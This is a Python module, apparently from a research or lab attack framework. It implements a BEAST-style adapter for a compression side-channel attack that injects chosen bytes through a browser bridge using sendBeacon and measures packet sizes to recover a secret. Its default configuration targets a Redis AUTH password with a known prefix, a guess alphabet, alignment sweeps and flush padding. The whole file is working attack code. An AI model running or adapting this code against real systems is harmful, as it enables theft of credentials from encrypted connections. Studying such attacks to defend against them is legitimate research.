"""BEAST adapter — browser-based injection via sendBeacon().

Preserves the current behaviour: sendBeacon() fuses CHANNEL_OPEN + data
into a single injection, so there is no pre-opened measure channel.
The measurement filter (config.measurement_min_segment_size, default 100
for BEAST) excludes the small CHANNEL_OPEN packet.

BrowserBridge (shared WebSocket state) is owned by mitm.py and injected
into the adapter; the adapter only sees an `inject(bytes)` coroutine.
"""

from __future__ import annotations

import asyncio
import random
import secrets
from typing import TYPE_CHECKING, Any

from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.adapters.direct import CLIENT_BASE, _sum_c2s

if TYPE_CHECKING:
    import aiohttp


class BeastAdapter:
    def __init__(self, packet_log: Any, bridge: Any) -> None:
        self._packet_log = packet_log
        self._bridge = bridge
        self._config: AttackConfig | None = None
        self._session: "aiohttp.ClientSession | None" = None

    async def setup(self, config: AttackConfig, http_session: "aiohttp.ClientSession") -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        # 1. Flush via sendBeacon. A fresh random block per measurement
        # prevents any specific flush content from creating a persistent
        # LZ77-bias that survives averaging across rounds — the fatal
        # mode that a cached flush would cause.
        if cfg.flush_bytes > 0:
            await self._bridge.inject(_make_flush(cfg))
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 2. Trigger secret
        async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
            await r.read()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 3. Clear log, send guess, read
        self._packet_log.clear()
        await self._bridge.inject(prefix + candidate + alignment)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        return _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\r",
            min_margin=64,
            max_rounds=64,
            settle=0.01,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=False,
            stall_detection=False,
            alignment_hint_carryover=False,
            outlier_threshold=32,
            flush_bytes=33000,
            flush_pool="high_ascii",
            measurement_min_segment_size=100,
            label="beast-default",
        )


def _make_flush(cfg: AttackConfig) -> bytes:
    if cfg.flush_pool == "high_ascii":
        return bytes(random.choices(range(0x80, 0x100), k=cfg.flush_bytes))
    # Defensive fallback; BEAST shouldn't use secrets_random in practice,
    # but the engine's outlier retry may regenerate with any legitimate
    # pool setting.
    return secrets.token_bytes(cfg.flush_bytes)
